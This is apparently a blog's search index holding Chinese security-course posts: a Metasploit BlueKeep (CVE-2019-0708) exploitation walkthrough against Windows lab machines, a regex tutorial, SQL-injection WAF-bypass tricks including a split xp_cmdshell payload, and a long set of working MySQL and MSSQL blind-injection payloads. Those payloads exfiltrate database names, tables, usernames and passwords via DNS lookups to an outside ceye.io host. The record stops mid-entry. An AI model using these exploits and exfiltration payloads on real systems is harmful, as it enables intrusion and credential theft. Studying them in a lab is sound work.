<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>msf CVE_2019_0708后门连接win7和win2008</title>
      <link href="/2019/09/08/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/"/>
      <url>/2019/09/08/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-0708影响范围"><a href="#CVE-2019-0708影响范围" class="headerlink" title="CVE-2019-0708影响范围"></a>CVE-2019-0708影响范围</h1><p>Windows 7<br>Windows server 2008 R2<br>Windows server 2008<br>Windows 2003<br>Windows xp<br>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p><h1 id="靶子机设置"><a href="#靶子机设置" class="headerlink" title="靶子机设置"></a>靶子机设置</h1><p><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908071844192.png" alt><br>查看IP地址cmd ipconfig</p><h1 id="kail运行"><a href="#kail运行" class="headerlink" title="kail运行"></a>kail运行</h1><h2 id="需要更新-msf"><a href="#需要更新-msf" class="headerlink" title="需要更新 msf"></a>需要更新 msf</h2><p><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072045652.png" alt><br>更新版本</p><pre><code>apt-get install metasploit-framework</code></pre><p><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072102993.png" alt></p><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><h3 id="靶子机是-win7-x64"><a href="#靶子机是-win7-x64" class="headerlink" title="靶子机是 win7 x64"></a>靶子机是 win7 x64</h3><p>进入msf查询武器<br>执行 search 0708<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072144281.png" alt></p><pre><code>wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</code></pre><p>或者自己下载套件，执行下面命令复制套件</p><pre><code>将攻击套件导入安装在不能复制创建文件夹在执行复制命令    cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/    cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/    cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/    cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</code></pre><p>执行 reload_all 重新加载 payload<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072531963.png" alt><br>设置目标ip、命名标号或跳过默认、执行exploit<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072635576.png" alt><br>查看设置 show options<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908072706265.png" alt><br>联结成功<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073004830.png" alt><br>执行cmd，运行notepad，mspaint<br>靶子机的运行情况<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073133052.png" alt></p><h3 id="靶子机是-win2008"><a href="#靶子机是-win2008" class="headerlink" title="靶子机是 win2008"></a>靶子机是 win2008</h3><p>如果出现远程连接不能点等的问题<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073308414.png" alt><br>安装远程协助<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073311813.png" alt><br>问题解决<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073317051.png" alt><br>使用kail进行远程连接<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073400922.png" alt><br>多次尝试后出现总是出现蓝屏<br><img src="/msf-CVE_2019_0708%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5win7%E5%92%8Cwin2008/20190908073429044.png" alt></p><h1 id="补充关于kail虚拟机的复制和文件拖拽功能"><a href="#补充关于kail虚拟机的复制和文件拖拽功能" class="headerlink" title="补充关于kail虚拟机的复制和文件拖拽功能"></a>补充关于kail虚拟机的复制和文件拖拽功能</h1><p>VM安装tools，解压执行 ./  自行安装后，如果出现不能文件拖拽<br>执行以下命令即可</p><pre><code>sudo apt-get autoremove open-vm-toolssudo apt-get install open-vm-toolssudo apt-get install open-vm-tools-desktop</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 第八周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/09/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/09/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h1><pre><code>Windows/Dos下的通配符 *和?    \b 单词的开头或结尾，单词的分界处    .  匹配除了换行符以外的任意字符。    *  指定数量，前边的内容可以连续重复出现任意次以使整个表达式得到匹配    .*  任意数量的不包含换行的字符        \bhi\b.*\bLucy\b        匹配单词hi，任意个字符，不能使换行，最后匹配Lucy    \d    匹配一位数字-     只匹配它本身或者减号0\d{2}-\d{8}    {2} 必须连续重复匹配两次    {8} 必须连续重复匹配8次    \s    匹配任意的空白符，包括空格，制表符（Tab），换行符，中文全角空格等。    \w    匹配字符或数字或下划线或汉字等        对于中文/汉字的特殊处理是由于 .Net提供的正则表达式引擎的支持，其它情况下需要查看相关文档        \ba\w*\b    匹配以字母a开头的单词，是以任意数量的字母或数字，在单词结束处    \d+ 匹配1个或更多连续的数字。    + 和 * 类似，区别：*（可能是0次） +（可能1次或更多）        \b\w{6}\b    匹配刚好6个字母/数字的单词</code></pre><p><strong>常用的元字符</strong></p><p><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/20190907080026522.png" alt></p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>规则从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，依次类推。向后引用用于重复搜索前面某个分组匹配的文本。</p><pre><code>Eg：\1 代表分组 1 匹配的文本。        \b(\w+)\b\s+\1\b        \b(\w)\b 匹配单词     \s+ 匹配任意空白符  \1这里等价于 \b(\w+)    自定义子表达式    (?&lt;word&gt;\w+) 或者 (?’word’\w+)    将该组名指定为word</code></pre><h2 id="常用的分组-语法"><a href="#常用的分组-语法" class="headerlink" title="常用的分组 ()语法"></a>常用的分组 ()语法</h2><pre><code>    捕获：          (exp)            匹配exp，并捕获文本到自动命名的组里          (?&lt;name&gt;exp)    匹配exp，并捕获文本到名称为 name的组里（也可写成 (?’name’exp) ）          (?:exp)            匹配exp，不捕获匹配的文本，也不给此分组分配组号    零宽断言：          (?=exp)        匹配exp前面的位置          (?&lt;=exp)        匹配exp后面的位置          (?!exp)            匹配后面跟的不是exp的位置          (?&lt;!exp)        匹配前面不是exp的位置    注释：          (?#comment)    这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读</code></pre><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>用于查找某些东西（但并不包括这些内容）之前或之后的东西。它们像 \b ^ $ 那样用于指定一个位置。断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配</p><pre><code>        \b\w+(?=ing\b)        匹配以ing结尾的单词的前面部分（除了ing以外的部分）        (?&lt;=\bre)\w+\b        匹配以re开头的单词的后半部分（除了re以外的部分）</code></pre><h2 id="零度负预测先行断言"><a href="#零度负预测先行断言" class="headerlink" title="零度负预测先行断言"></a>零度负预测先行断言</h2><p>查找不是某个字符或某个字符类里的字符的方法（反义）</p><pre><code>(?!exp) 断言此位置的后面不能匹配表达式 exp        \d{3}(?!\d)，匹配三位数字，而且这三位数字的后面不能是数字        \b((?!abc)\w)+\b    匹配不包含连续字符串 abc的单词        \b\w*q[^u]\w*\b     包含后面不是字母u的字母q的单词出现的问题，如果q出现词尾，会自动将词后的符号给[^u]，负向零断言就可以解决此问题。特点：只匹配不消耗字符。        修改后：        \b\w*q(?!u)\w*\b</code></pre><h2 id="零度正回顾后发断言"><a href="#零度正回顾后发断言" class="headerlink" title="零度正回顾后发断言"></a>零度正回顾后发断言</h2><pre><code>(?&lt;!exp)         断言此位置的前面不能匹配表达式exp(?&lt;![a-z])\d{7}    匹配前面不是小写字母的七位数字        (?&lt;=&lt;(\w+)&gt;).*(?&lt;=&lt;\/\1&gt;)                (?&lt;=&lt;(\w+)&gt;)    等价于  (?&lt;=exp)        exp= &lt;(\w+)&gt;        .*    匹配任意字符        (?&lt;=&lt;\/\1&gt;)    等价于    (?&lt;=exp)        exp= &lt;\/\1&gt;    其中 \/ 是转义 \1是后向引用（别名）        匹配出来的结果类似于 &lt;b&gt;字符&lt;/b&gt;</code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code>(?#comment) 包含注释。</code></pre><pre><code>    要包含注释，最好启用“忽略模式里的空白符”，这样在编写表达式时能任意的添加空格。    启用“忽略模式里的空白符”，在#后面到这一行结束的所有文本都将被当成注释忽略掉    (?&lt;=&lt;(\w+)&gt;).*(?&lt;=&lt;\/\1&gt;) 可以改写为        (?&lt;= #        断言要匹配的文本前缀        &lt;(\w+)&gt; #        查找 &lt;字母或数字&gt;    （即HTML/XML标签）        ) #            前缀结束        .* #            匹配任意文本        (?= #        匹配任意文本        &lt;\/\1&gt; #        查找 &lt;&gt; 起来的内容        ) #            后缀结束</code></pre><h2 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h2><p>在使整个表达式能得到匹配的前提下匹配尽可能多的字符。</p><pre><code>a.*b        它将会匹配最长的以 a开始，以b结束的字符串    </code></pre><h2 id="懒惰匹配"><a href="#懒惰匹配" class="headerlink" title="懒惰匹配"></a>懒惰匹配</h2><p>在使整个表达式能得到匹配的前提下匹配尽可能少的字符。</p><pre><code>a.*?b    会匹配尽可能短的 以a开始，以b结束的字符串</code></pre><p> <strong>正则表达式的规则：最先开始的匹配拥有最高的优先权</strong><br><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/20190907081143015.png" alt></p><h1 id="正则表达式常用的处理选项"><a href="#正则表达式常用的处理选项" class="headerlink" title="正则表达式常用的处理选项"></a>正则表达式常用的处理选项</h1><p>C#中，可以使用Regex(String,RegexOptions) 构造函数来设置<br>.Net中可以常用的正则表达式选项<br><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/20190907081258797.png" alt><br><strong>说明：单行模式和多行模式之间没有任何关系，更改的是通配符的含义</strong></p><h2 id="平衡组-递归匹配"><a href="#平衡组-递归匹配" class="headerlink" title="平衡组/递归匹配"></a>平衡组/递归匹配</h2><p>由 .Net支持，其他语言/库不一定</p><pre><code>    (?’group’)            把捕获的内容命名为 group 并压入堆栈（类似入栈）    (?’-group’)        从堆栈上弹出最后压入堆栈的名为 group 的捕获内容，如果堆栈本来为空，则本分组匹配失败（类似出栈）    (?(group)yes|no)    如果堆栈上存在以名为 group 的捕获内容，继续匹配 Yes部分的表达式，否则继续匹配 No部分的表达式    (?!)                零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</code></pre><p>事例</p><pre><code>        &lt; #                        最外层的左括号            [^&lt;&gt;]* #                匹配括号的内容            (                (                    (?’open’&lt;) #    把捕获到的open压入栈                    [^&lt;&gt;]* #        匹配不是括号的内容                )+                (                    (?’-open’) #    把捕获到的open出栈                    [^&lt;&gt;]* #        匹配不是括号的内容                )+            )*            (?(open)(?!)) #        判断栈中是否存在open，有则匹配失败        &gt; #                        最外层的右括号</code></pre><pre><code>平衡组最常见的就是匹配HTML，匹配&lt;div&gt;的例子</code></pre><pre><code>    &lt;div[^&gt;]*&gt;[^&lt;&gt;]*(((?&#39;Open&#39;&lt;div[^&gt;]*&gt;)[^&lt;&gt;]*)+((?&#39;-Open&#39;&lt;/div&gt;)[^&lt;&gt;]*)+)*(?(Open)(?!))&lt;/div&gt;        &lt;div[^&gt;]*&gt; #                            头标签            [^&lt;&gt;]* #                            匹配不是 &lt;&gt;的内容            (                (                    (?&#39;Open&#39;&lt;div[^&gt;]*&gt;) #        将 &lt;div[^&gt;]*&gt;名成别名 open压入栈中                    [^&lt;&gt;]* #                    匹配不是 &lt;&gt;的内容                )+ #                            该元组重复1或更多次                (                    (?&#39;-Open&#39;&lt;/div&gt;) #         将 &lt;div[^&gt;]*&gt;名成别名 open出栈                    [^&lt;&gt;]*                    匹配不是 &lt;&gt;的内容                )+ #                            该元组重复1或更多次            )* #                                整个元组重复0或一次            (?(Open)(?!))                        判断栈中是否还存在Open别名的元组，有则不匹配        &lt;/div&gt; #                                闭合标签</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕WAF</title>
      <link href="/2019/09/07/%E7%BB%95WAF/"/>
      <url>/2019/09/07/%E7%BB%95WAF/</url>
      
        <content type="html"><![CDATA[<h1 id="waf处理数据的模式"><a href="#waf处理数据的模式" class="headerlink" title="waf处理数据的模式"></a>waf处理数据的模式</h1><pre><code>    确认身份        白名单=〉通过    大部分企业内部用来数据交流        非白名单=〉数据分析                    规则匹配（正则表达式过滤信息）</code></pre><h2 id="大致分类"><a href="#大致分类" class="headerlink" title="大致分类"></a>大致分类</h2><pre><code>1．    硬件waf：性能好，功能全面，厂商的盈利点2．    软件waf：安装简单，易使用3．    代码waf：简单有效4．    云waf：</code></pre><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="常见的注释符："><a href="#常见的注释符：" class="headerlink" title="常见的注释符："></a>常见的注释符：</h3><pre><code>//，--，/**/，--+，-- -，/*!*/ 只有MySQL能识别，在注释里的语句会被执行                  50000表示假如，数据库在5.00.00以上版本，会被识别</code></pre><h3 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h3><p>url编码<br>十六进制编码<br>unicode编码<br>特殊字符代替空格</p><h3 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h3><p>函数与变量</p><pre><code>            hex()、bin()  ==&gt; ascii()            sleep() ==&gt; benchmark()            concat_ws() ==&gt; group_concat()            mid()、substr() ==&gt; substring()            @@version ==&gt; version()            @@datadir ==&gt; datadir()</code></pre><h3 id="逻辑符号"><a href="#逻辑符号" class="headerlink" title="逻辑符号"></a>逻辑符号</h3><pre><code>            and          &amp;&amp;            or          ||            在不能用 = 考虑使用  &lt; &gt; </code></pre><h3 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h3><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><pre><code>      + 用来连接字符串 – 也可用来连接字符串 . 也可用来连接字符串，都可以跳过空格和关键字过滤            @ 一个@表示用户定义，@@表示系统变量            () 绕过空格</code></pre><h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><pre><code>            ‘se’+’lec’+’t’            %S%E%L%E%C%T 1            ?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell’’ net user” ’)            !和() ‘or.--+2=--!!!’2</code></pre><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><p>有些WAF，将admin dede install等特殊目录作为白名单</p><h3 id="HTTP参数控制"><a href="#HTTP参数控制" class="headerlink" title="HTTP参数控制"></a>HTTP参数控制</h3><pre><code>    对查询语句的参数修改，包括HTTP方法、HTTP头控制        1．    http重复参数污染        2．    http分割注入</code></pre><h3 id="变量带入方式"><a href="#变量带入方式" class="headerlink" title="变量带入方式"></a>变量带入方式</h3><pre><code>对于防注释的，使用内联的方式绕过</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第八周 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql和Mssql盲注外带数据的DNS查询方式</title>
      <link href="/2019/09/07/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/"/>
      <url>/2019/09/07/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS查询的准备"><a href="#DNS查询的准备" class="headerlink" title="DNS查询的准备"></a>DNS查询的准备</h1><h2 id="注册帐户"><a href="#注册帐户" class="headerlink" title="注册帐户"></a>注册帐户</h2><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907052155587.png" alt></p><h1 id="MySQL外带数据进行DNS查询"><a href="#MySQL外带数据进行DNS查询" class="headerlink" title="MySQL外带数据进行DNS查询"></a>MySQL外带数据进行DNS查询</h1><p>相对简单，使用 load_file() 即可<br>查看相关配置</p><pre><code>show global variables like &#39;%secure%&#39;;</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035312660.png" alt></p><pre><code>Secure_file_priv 必须为空才可以，null不行修改配置文件</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035342010.png" alt><br>重启MySQL即可<br>检测 能否使用 load_file() 注意转义字符<br><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035351858.png" alt><br>尝试DNS服务器发送信息</p><pre><code>    Select load_file(concat(&#39;\\\\&#39;,version(),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));    </code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035429123.png" alt><br><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035458909.png" alt></p><h1 id="mysql数据库在windows系统中DNS外带数据方式注入"><a href="#mysql数据库在windows系统中DNS外带数据方式注入" class="headerlink" title="mysql数据库在windows系统中DNS外带数据方式注入"></a>mysql数据库在windows系统中DNS外带数据方式注入</h1><p><em>开启权限，参照MySQL利用外带数据进行DNS查询</em><br>1。查库</p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select database()),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907040442291.png" alt><br>2。查表</p><pre><code>select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907040506762.png" alt></p><pre><code>select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 1,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907040523050.png" alt><br>3。查列</p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select  column_name from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39; limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041037342.png" alt></p><pre><code>依次类推分别是 ‘anquan’,’avatar’,’email’,’id’,’passwd’,’sex’,’uname’</code></pre><p>4。查内容</p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select id from item.users limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041218856.png" alt></p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select uname from item.users limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041233795.png" alt></p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select passwd from item.users limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041319797.png" alt><br>依次类推即可查处所有的数据信息。</p><h1 id="利用mssql数据库的四种DNS外带数据的方式注入"><a href="#利用mssql数据库的四种DNS外带数据的方式注入" class="headerlink" title="利用mssql数据库的四种DNS外带数据的方式注入"></a>利用mssql数据库的四种DNS外带数据的方式注入</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>MSSQL SQLI Labs 6<br>确定是 ‘ 布尔延时盲注，使用多语句<br>1。获取当前表名</p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907042844308.png" alt><br>2。获取该库下的表</p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 table_name from(select top 1 table_name from INFORMATION_SCHEMA.tables order by 1 desc ) as b order by 1 asc);exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907043241063.png" alt></p><pre><code>通过修改第二个top 的数 2,3,4,即可一次遍历出所有的表分别是    eamils;uagents;referers;users</code></pre><p>3。获取表下的列 </p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 column_name from  INFORMATION_SCHEMA.COLUMNS);exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907045456186.png" alt></p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 column_name from  INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME not in (&#39;id&#39;));exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907045518927.png" alt></p><pre class="line-numbers language-以此类推以此确定有"><code class="language-以此类推以此确定有"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4。获取字段,以users为例</p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 username from (select top 1 username from users order by 1 desc) as b order by 1 asc);exec(&#39;master..xp_subdirs &quot;ping &#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io &quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907050051344.png" alt></p><pre><code>至此xp_subdirs爆字段完成。因为之前尝试过xp_subdirs、xp_dirtree和xp_fileexist方式几乎一致，使用xp_cmdshell方式进行爆破</code></pre><h1 id="xp-cmdshell-开启"><a href="#xp-cmdshell-开启" class="headerlink" title="xp_cmdshell 开启"></a>xp_cmdshell 开启</h1><pre><code>sp_configure &#39;show advanced options&#39;,1reconfiguregosp_configure &#39;xp_cmdshell&#39;,1reconfigurego</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907051948152.png" alt></p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 username from (select top 1 username from users order by 1 desc) as b order by 1 asc);exec(&#39;master..xp_cmdshell &quot;ping &#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io &quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907052010885.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第八周 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Access数据库的union查询</title>
      <link href="/2019/09/07/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
